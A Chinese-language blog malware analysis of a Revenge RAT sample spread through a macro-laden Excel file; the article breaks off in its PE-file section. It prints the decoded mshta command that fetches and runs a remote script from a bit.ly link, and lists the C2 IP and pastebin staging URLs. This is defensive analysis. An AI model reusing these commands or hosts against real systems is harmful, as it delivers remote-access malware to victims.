@@ -1,0 +1,334 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Revenge RAT远控木马分析报告 | Hexo</title><meta name="description" content="基本信息报告名称：Revenge RAT远控木马分析报告 报告更新日期：2019&#x2F;9&#x2F;23 样本发现日期：2019&#x2F;9&#x2F;15 样本格式：xls文本文档 可能受到威胁的系统：Windows系列 分析环境及工具：win7 32位，BCompare，ProcessMonitor，火绒剑     FileName FileType FileSize MD5 SHA1    Order___67987389"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/03/30/Revenge%20RAT%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Revenge RAT远控木马分析报告"><meta property="og:url" content="http://example.com/2021/03/30/Revenge%20RAT%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="基本信息报告名称：Revenge RAT远控木马分析报告 报告更新日期：2019&#x2F;9&#x2F;23 样本发现日期：2019&#x2F;9&#x2F;15 样本格式：xls文本文档 可能受到威胁的系统：Windows系列 分析环境及工具：win7 32位，BCompare，ProcessMonitor，火绒剑     FileName FileType FileSize MD5 SHA1    Order___67987389"><meta property="og:image" content="http://example.com/null"><meta property="article:published_time" content="2021-03-30T05:45:25.000Z"><meta property="article:modified_time" content="2021-03-30T11:04:17.993Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime: '',
+  date_suffix: {"one_hour":"Just","hours":"hours ago","day":"days ago"},
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+    },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-03-30 19:04:17'
+}</script><noscript><style type="text/css">
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">14</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">3.</span> <span class="toc-text">流程图</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">动态行为分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">详细行为分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">宏代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AE%8F%E5%AF%86%E7%A0%81"><span class="toc-number">5.1.1.</span> <span class="toc-text">破解宏密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%AE%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">5.1.2.</span> <span class="toc-text">分析宏代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mshta%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95"><span class="toc-number">5.1.3.</span> <span class="toc-text">mshta简单用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-1%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">URL-1下载文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90URL%E4%B8%ADjs"><span class="toc-number">5.2.1.</span> <span class="toc-text">分析URL中js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90js%E4%B8%AD%E8%A7%A3%E5%AF%86%E7%9A%84vbs"><span class="toc-number">5.2.2.</span> <span class="toc-text">分析js中解密的vbs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-2%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">5.3.</span> <span class="toc-text">URL-2下载文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90URL%E4%B8%ADjs-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">分析URL中js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90js%E8%A7%A3%E5%AF%86%E7%9A%84vbs"><span class="toc-number">5.3.2.</span> <span class="toc-text">分析js解密的vbs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B7%B7%E6%B7%86powershell%E4%BB%A3%E7%A0%81"><span class="toc-number">5.3.3.</span> <span class="toc-text">解混淆powershell代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-3%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">5.4.</span> <span class="toc-text">URL-3下载文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B7%B7%E6%B7%86URL%E4%B8%ADps1"><span class="toc-number">5.4.1.</span> <span class="toc-text">解混淆URL中ps1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90URL%E4%B8%ADps1"><span class="toc-number">5.4.2.</span> <span class="toc-text">分析URL中ps1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-4%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">5.5.</span> <span class="toc-text">URL-4下载文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90URL%E4%B8%AD%E6%96%87%E6%9C%AC"><span class="toc-number">5.5.1.</span> <span class="toc-text">分析URL中文本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B6%E7%9A%84dump"><span class="toc-number">5.5.2.</span> <span class="toc-text">PE文件的dump</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B61"><span class="toc-number">5.6.</span> <span class="toc-text">PE文件1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B61%E8%A7%A3%E6%B7%B7%E6%B7%86"><span class="toc-number">5.6.1.</span> <span class="toc-text">PE文件1解混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90PE%E6%96%87%E4%BB%B61"><span class="toc-number">5.6.2.</span> <span class="toc-text">分析PE文件1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B62"><span class="toc-number">5.7.</span> <span class="toc-text">PE文件2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E6%96%87%E4%BB%B62%E8%A7%A3%E6%B7%B7%E6%B7%86"><span class="toc-number">5.7.1.</span> <span class="toc-text">PE文件2解混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90PE%E6%96%87%E4%BB%B62"><span class="toc-number">5.7.2.</span> <span class="toc-text">分析PE文件2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E6%BA%AF%E6%BA%90"><span class="toc-number">6.</span> <span class="toc-text">样本溯源</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">查杀方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">附件</span></a></li></ol></div></div></div><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Revenge RAT远控木马分析报告</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-03-30T05:45:25.000Z" title="Created 2021-03-30 13:45:25">2021-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-03-30T11:04:17.993Z" title="Updated 2021-03-30 19:04:17">2021-03-30</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>报告名称：Revenge RAT远控木马分析报告</p>
+<p>报告更新日期：2019/9/23</p>
+<p>样本发现日期：2019/9/15</p>
+<p>样本格式：xls文本文档</p>
+<p>可能受到威胁的系统：Windows系列</p>
+<p>分析环境及工具：win7 32位，BCompare，ProcessMonitor，火绒剑</p>
+
+<table>
+<thead>
+<tr>
+<th>FileName</th>
+<th>FileType</th>
+<th>FileSize</th>
+<th>MD5</th>
+<th>SHA1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Order___679873892</td>
+<td>远控木马</td>
+<td>41472 bytes</td>
+<td>7641FEF8ABC7CB24B66655D11EF3DAF2</td>
+<td>09EFB8F78505AF05CE39D3789770F361C672572E</td>
+</tr>
+</tbody></table>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p style="text-indent:2em">此病毒利用文件中的宏诱导用户执行宏代码，之后执行在C&C上下载的文件，注入到系统程序中，此病毒能跑到的行为很少，原因是病毒的主代码逻辑最终是个远控程序注入，所以能观察到之后网络行为。</p>
+
+<h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_1.png" alt="image"></p>
+<h1 id="动态行为分析"><a href="#动态行为分析" class="headerlink" title="动态行为分析"></a>动态行为分析</h1><p style="text-indent:2em">拿到样本之后，对样本进行动态行为分析，发现了除了网络行为并没有发现其他异常行为。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可疑IP：216.170.126.123:777</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_2.png" alt="image"></p>
+<h1 id="详细行为分析"><a href="#详细行为分析" class="headerlink" title="详细行为分析"></a>详细行为分析</h1><h2 id="宏代码"><a href="#宏代码" class="headerlink" title="宏代码"></a>宏代码</h2><h3 id="破解宏密码"><a href="#破解宏密码" class="headerlink" title="破解宏密码"></a>破解宏密码</h3><p style="text-indent:2em">首先打开文档，提示需要启用宏，给人的第一反应就是宏代码病毒，这个时候启用宏代码查看逻辑，从文档的视图入口处进入宏发现并没有宏代码，判断宏代码是否经过加密。ALT+F11之后，发现确实有宏代码，这时候需要知道宏密码。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_3.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_4.png" alt="image"></p>
+<p style="text-indent:2em">宏密码的破解方式有多种，这个VBA的宏密码采用工具即可直接破解，打开工具office Key，将文件直接拖进去发现宏密码为：25KP</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_5.png" alt="image"></p>
+<h3 id="分析宏代码"><a href="#分析宏代码" class="headerlink" title="分析宏代码"></a>分析宏代码</h3><p style="text-indent:2em">打开宏代码之后，根据函数名称判断是打开工作簿执行的逻辑，一眼看去宏代码是经过简单的混淆，直接下断点调试发现，这么多混淆的代码的实质是生成一个url，最后调用shell对象利用mshta启用hta访问这个url。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提取拼接字符串：mshta &quot;http:&#x2F;&#x2F;bit.ly&#x2F;8hsshjahassahsh&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_6.png" alt="image"><br><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_7.png" alt="image"></p>
+<h3 id="mshta简单用法"><a href="#mshta简单用法" class="headerlink" title="mshta简单用法"></a>mshta简单用法</h3><p style="text-indent:2em">mshta.exe是HTML应用程序主机，通过启用hta界面访问url，本例中简单模拟了一下说明宏代码是如何访问url的。</p>
+<p style="text-indent:2em">命令行下调用mshta.exe执行传入url参数打开百度。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_8.png" alt="image"></p>
+<h2 id="URL-1下载文件分析"><a href="#URL-1下载文件分析" class="headerlink" title="URL-1下载文件分析"></a>URL-1下载文件分析</h2><h3 id="分析URL中js"><a href="#分析URL中js" class="headerlink" title="分析URL中js"></a>分析URL中js</h3><p style="text-indent:2em">url-1：http://bit.ly/8hsshjahassahsh</p>
+<p style="text-indent:2em">在这个url中会有一段可执行的js代码，将代码提取出来发现是利用document对象调用执行的一段利用escape方法加密的字符串。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：bit.ly_8hsshjahassahsh.js</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_9.png" alt="image"></p>
+<p style="text-indent:2em">解密被加密的字符串可以使用下面的方法。</p>
+<p style="text-indent:2em">利用js代码给出的解密函数，打开浏览器按下F12，在Console控制台下输入Console.log(unescape('此处填充字符串'))，即可解密。或者直接搜索在线unescape解密，实现原理是一样的。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_10.png" alt="image"></p>
+<h3 id="分析js中解密的vbs"><a href="#分析js中解密的vbs" class="headerlink" title="分析js中解密的vbs"></a>分析js中解密的vbs</h3><p style="text-indent:2em">获取vbs代码之后，发现创建了计划任务、写入注册表等操作，更为重要的是，在此vb代码中，发现了三个url，并且url被加载到计划任务中，提取这三个url并继续追踪。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：bit.ly_8hsshjahassahsh.vbs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域名1：http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;vXpe74L2</span><br><span class="line">域名2：http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;JdTuEmc5</span><br><span class="line">域名3：http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;CGe3S2Vf</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_11.png" alt="image"></p>
+<h2 id="URL-2下载文件分析"><a href="#URL-2下载文件分析" class="headerlink" title="URL-2下载文件分析"></a>URL-2下载文件分析</h2><h3 id="分析URL中js-1"><a href="#分析URL中js-1" class="headerlink" title="分析URL中js"></a>分析URL中js</h3><p style="text-indent:2em">首先查看这个com主机名，发现是一个国外的分享文本的平台，主要分享一些文本代码之类的网站。可能由于该网站https转换的晚，打开该网站需要将http换成https，打开之后发现js文本。同时以同样的方式打开另外两个域名，发现内容相同。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：pastebin.com_raw_vXpe74L2.js</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_12.png" alt="image"></p>
+<h3 id="分析js解密的vbs"><a href="#分析js解密的vbs" class="headerlink" title="分析js解密的vbs"></a>分析js解密的vbs</h3><p style="text-indent:2em">将以上代码拷贝出来，以同样的方式进行解密，之后又得到VBS代码。一眼看上去，该代码也是经过混淆的。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：pastebin.com_raw_vXpe74L2.vbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_13.png" alt="image"></p>
+<p style="text-indent:2em">按照代码调用的函数，先将字符替换，再反转字符，调用Powershell执行解混淆代码。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_14.png" alt="image"></p>
+<h3 id="解混淆powershell代码"><a href="#解混淆powershell代码" class="headerlink" title="解混淆powershell代码"></a>解混淆powershell代码</h3><p style="text-indent:2em">执行完以上操作之后，获得powershell代码，发现此代码也是经过混淆的，需要解混淆powershell代码。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：pastebin.com_raw_vXpe74L2.ps1</span><br></pre></td></tr></table></figure>
+<p style="text-indent:2em">将文中的IEX字段改成Write-host，将文件后缀改成ps1，再执行该代码的时候重定向到文本文件，此时输出解混淆后的powershell代码。在分析powershell代码之前，首先看下载的东西。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域名1：https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;wMG90xwi</span><br><span class="line">域名2：https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;W455MkAZ</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_15.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_16.png" alt="image"></p>
+<h2 id="URL-3下载文件分析"><a href="#URL-3下载文件分析" class="headerlink" title="URL-3下载文件分析"></a>URL-3下载文件分析</h2><h3 id="解混淆URL中ps1"><a href="#解混淆URL中ps1" class="headerlink" title="解混淆URL中ps1"></a>解混淆URL中ps1</h3><p style="text-indent:2em">打开URL发现还是文本类型的字符，从代码类型来看，还是Powershell代码，根据代码调用的函数看，需要将代码中的ascii码首先转换成字符。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件名：pastebin.com_raw_wMG90xwi.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_17.png" alt="image"></p>
+<p style="text-indent:2em">打开解密网站：<a target="_blank" rel="noopener" href='https://gchq.github.io/CyberChef'>https://gchq.github.io/CyberChef</a>       将字符串按照下图的方法粘贴到指定位置，会看到下方有解密出来的代码。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_18.png" alt="image"></p>
+<h3 id="分析URL中ps1"><a href="#分析URL中ps1" class="headerlink" title="分析URL中ps1"></a>分析URL中ps1</h3><p style="text-indent:2em">首先是看解混淆之后的文件是powershell代码，再看定义的数组，发现还有些许的混淆，自己看数据发现，数组头部是4D5A90，基本上可以判断该数组中存放了一个PE文件，继续向下看。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_19.png" alt="image"></p>
+<p style="text-indent:2em">在文件最后发现，用字符串替换的方法将轻微的混淆解出来，在新线程中load这个PE文件。那么接下来要做的是将这个PE文件先dump出来。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_20.png" alt="image"></p>
+<h2 id="URL-4下载文件分析"><a href="#URL-4下载文件分析" class="headerlink" title="URL-4下载文件分析"></a>URL-4下载文件分析</h2><h3 id="分析URL中文本"><a href="#分析URL中文本" class="headerlink" title="分析URL中文本"></a>分析URL中文本</h3><p style="text-indent:2em">访问这个URL，在该URL中同样发现文本字符，查看数据，文本开头为4D5A90，可以基本判断此文件为PE类型的文件。查看文本发现文件有混淆，看下powershell代码中是怎么解混淆的，将文本拖进notepad++中将混淆字符替换。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_21.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_22.png" alt="image"></p>
+<h3 id="PE文件的dump"><a href="#PE文件的dump" class="headerlink" title="PE文件的dump"></a>PE文件的dump</h3><p style="text-indent:2em">拿到解混淆的PE文件(包括URL-3中获取到的PE文件)，文件内容是十六进制数，这个时候需要利用工具转化为PE文件，再进行分析。</p>
+<p style="text-indent:2em">打开解密网站：<a target="_blank" rel="noopener" href='https://gchq.github.io/CyberChef'>https://gchq.github.io/CyberChef</a>按照下图操作将获取到的十六进制数粘贴进去，之后将转化后的PE文件保存下来。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">附件文件名：PE-1_dump.dll</span><br><span class="line">附件文件名：PE-2_dump.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_23.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_24.png" alt="image"></p>
+<h2 id="PE文件1"><a href="#PE文件1" class="headerlink" title="PE文件1"></a>PE文件1</h2><h3 id="PE文件1解混淆"><a href="#PE文件1解混淆" class="headerlink" title="PE文件1解混淆"></a>PE文件1解混淆</h3><p style="text-indent:2em">首先对PE文件1进行查壳，发现该文件没有壳，是.NET编译的dll文件，可以直接拖进dnSPy反编译一下继续分析。</p>
+
